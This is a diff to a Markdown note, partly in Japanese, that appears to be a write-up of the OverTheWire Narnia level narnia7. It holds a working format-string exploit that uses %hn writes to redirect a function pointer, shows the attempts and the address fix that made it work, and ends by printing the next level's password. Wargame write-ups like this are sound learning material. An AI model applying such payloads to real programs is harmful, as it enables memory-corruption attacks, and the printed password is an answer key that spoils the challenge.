@@ -85,3 +85,44 @@ $(echo -e "\xfe\xbe\xff\xff\xfc\xbe\xff\xff"%.2044x%6\$hn%.32514x%7\$hn)
 
 
 ## In remote
+```sh
+narnia7@narnia:/narnia$ ./narnia7 AA
+goodfunction() = 0x80486e0
+hackedfunction() = 0x8048706
+
+before : ptrf() = 0x80486e0 (0xffffd68c)
+I guess you want to come to the hackedfunction...
+Welcome to the goodfunction, but i said the Hackedfunction..
+```
+
+\x8e\xd6\xff\xff\x8c\xd6\xff\xff
+
+次に、書き込むアドレスの値はhackedfunction()の値である0x8048706
+
+..........
+
+
+```sh
+narnia7@narnia:/narnia$ ./narnia7 $(echo -e "\x8e\xd6\xff\xff\x8c\xd6\xff\xff"%.2044x%6\$hn%.32514x%7\$hn)
+goodfunction() = 0x80486e0
+hackedfunction() = 0x8048706
+
+before : ptrf() = 0x80486e0 (0xffffd66c)
+I guess you want to come to the hackedfunction...
+Welcome to the goodfunction, but i said the Hackedfunction..
+```
+
+\x8e\xd6\xff\xff\x8c\xd6\xff\xff を \x6e\xd6\xff\xff\x6c\xd6\xff\xff に変えたらいけた
+before : ptrf() = 0x80486e0 (0xffffd68c) の 0xffffd68c を使うのではない？？？？
+
+```sh
+narnia7@narnia:/narnia$ ./narnia7 $(echo -e "\x6e\xd6\xff\xff\x6c\xd6\xff\xff"%.2044x%6\$hn%.32514x%7\$hn)
+goodfunction() = 0x80486e0
+hackedfunction() = 0x8048706
+
+before : ptrf() = 0x80486e0 (0xffffd66c)
+I guess you want to come to the hackedfunction...
+Way to go!!!!$ cat /etc/narnia_pass/narnia8
+mohthuphog
+$ exit
+```
